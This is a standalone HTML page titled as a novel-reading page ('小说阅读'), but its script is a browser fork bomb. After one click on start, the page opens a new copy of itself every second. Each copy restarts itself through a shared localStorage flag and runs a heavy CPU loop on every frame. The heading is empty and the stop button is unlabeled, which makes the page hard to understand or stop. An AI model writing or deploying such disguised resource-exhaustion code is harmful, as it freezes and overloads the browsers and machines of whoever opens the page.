<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <title>小说阅读</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            text-align: center;
            padding: 40px;
            background: #111;
            color: #eee;
        }

        h1 {
            font-weight: 400;
            margin-bottom: 20px;
        }

        #count {
            font-size: 2.5rem;
            font-weight: bold;
            color: #0f0;
        }

        button {
            font-size: 1.2rem;
            padding: 12px 28px;
            margin: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.15s;
        }

        #start {
            background: #0f0;
            color: #000;
        }

        #stop {
            background: #f33;
            color: #fff;
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        p.note {
            color: #aaa;
            margin-top: 24px;
            font-size: 0.9rem;
        }
    </style>
</head>

<body>
    <h1></h1>
    <div> <span id="count">0</span> </div>
    <button id="start">▶ 开始</button>
    <button id="stop" disabled></button>
    <p class="note">点击“开始”<br></p>

    <script>
        const $ = id => document.getElementById(id);
        const countSpan = $('count');
        const startBtn = $('start');
        const stopBtn = $('stop');
        const RUN_KEY = 'infinite_running';
        const COUNT_KEY = 'infinite_count';

        let timer = null;
        // ---- 新增：压力计算相关 ----
        const LOOPS_PER_FRAME = 300000;        // 每帧计算循环次数，可在此修改负载强度
        let cpuTimer = null;                   // 计算循环的 requestAnimationFrame ID

        function updateCount() {
            countSpan.textContent = localStorage.getItem(COUNT_KEY) || '0';
        }

        function changeCount(delta) {
            let val = parseInt(localStorage.getItem(COUNT_KEY) || '0') + delta;
            if (val < 0) val = 0;
            localStorage.setItem(COUNT_KEY, val);
            updateCount();
        }

        function openPage() {
            const w = window.open(location.href, '_blank');
            if (w) {
                changeCount(1);
                // 简单监听该窗口关闭
                const check = setInterval(() => {
                    if (w.closed) { clearInterval(check); changeCount(-1); }
                }, 800);
            }
        }

        // ---- 新增：重度计算任务 ----
        function heavyLoad() {
            let r = 0.1;
            for (let i = 0; i < LOOPS_PER_FRAME; i++) {
                r += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
                r *= 1.000001;
                if (i % 5000 === 0) r -= 0.000001;  // 防止引擎过度优化
            }
            return r;
        }

        function start() {
            if (timer) return;
            localStorage.setItem(RUN_KEY, '1');
            openPage();                          // 立即打开一个
            timer = setInterval(openPage, 1000); // 每200ms打开一个
            // ---- 新增：启动持续压力计算 ----
            if (!cpuTimer) {
                function loop() {
                    heavyLoad();
                    cpuTimer = requestAnimationFrame(loop);
                }
                cpuTimer = requestAnimationFrame(loop);
            }
            startBtn.disabled = true;
            stopBtn.disabled = false;
        }

        function stop() {
            if (timer) { clearInterval(timer); timer = null; }
            // ---- 新增：停止压力计算 ----
            if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
            localStorage.setItem(RUN_KEY, '0');
            startBtn.disabled = false;
            stopBtn.disabled = true;
        }

        // 页面加载时检查全局状态
        window.addEventListener('load', () => {
            updateCount();
            if (localStorage.getItem(RUN_KEY) === '1') {
                start(); // 其他窗口已启动，本窗口自动加入
            }
            window.addEventListener('storage', e => {
                if (e.key === RUN_KEY) {
                    e.newValue === '1' ? start() : stop();
                } else if (e.key === COUNT_KEY) {
                    updateCount();
                }
            });
            window.addEventListener('beforeunload', () => {
                changeCount(-1);
                // 窗口关闭时也停止本窗口的计算循环（避免内存泄漏）
                if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
                if (parseInt(localStorage.getItem(COUNT_KEY) || '0') <= 0) {
                    localStorage.removeItem(RUN_KEY);
                    localStorage.removeItem(COUNT_KEY);
                }
            });
        });

        startBtn.onclick = start;
        stopBtn.onclick = stop;
    </script>
</body>

</html>
